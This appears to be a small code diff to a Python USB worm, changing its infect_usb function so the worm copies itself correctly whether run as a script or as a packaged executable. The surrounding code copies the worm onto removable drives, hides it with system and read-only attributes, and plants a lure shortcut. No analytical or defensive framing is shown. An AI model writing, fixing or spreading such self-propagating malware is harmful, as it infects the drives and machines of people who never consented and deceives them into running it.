@@ -83,8 +83,9 @@ def create_shortcut(drive):
         pass
 
 def infect_usb(drive):
+    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
     worm_dest = os.path.join(drive, WORM_NAME)
-    shutil.copy(sys.executable, worm_dest)
+    shutil.copy(exe_path, worm_dest)
     subprocess.run(f"attrib +h +s +r {worm_dest}", shell=True)  # Hide worm
     create_shortcut(drive)  # Create lure shortcut
 
